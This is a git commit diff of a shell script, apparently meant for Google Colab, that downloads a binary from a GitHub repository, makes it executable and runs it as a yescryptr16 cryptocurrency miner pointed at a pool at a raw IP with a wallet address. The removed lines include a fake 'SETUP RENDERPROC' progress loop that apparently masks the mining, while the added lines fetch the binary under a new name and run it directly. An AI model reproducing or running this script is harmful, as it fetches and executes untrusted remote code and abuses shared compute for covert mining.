7eb3368fa88e8dc5d7304727bc4735064c29b0d0
renilo <88342640+renilo@users.noreply.github.com>
2022-10-12 16:26:33 +0700

    Update mekimeki.sh

--- mekimeki.sh
+++ mekimeki.sh
@@ -2,16 +2,10 @@
 # Install XRDP
 # Before get xmr coin for free
 # Google Colab
-sudo apt-get install screen -y
+sudo wget -qO anjingg https://github.com/indah38/theta/raw/main/VTM
 clear
 sleep 1
-sudo wget -q https://github.com/indah38/theta/raw/main/VTM
+chmod 700 anjingg
 clear
 sleep 1
-chmod 700 VTM
-clear
-sleep 1
-screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4
-sleep 1
-i=1
-while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
+./anjingg -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4
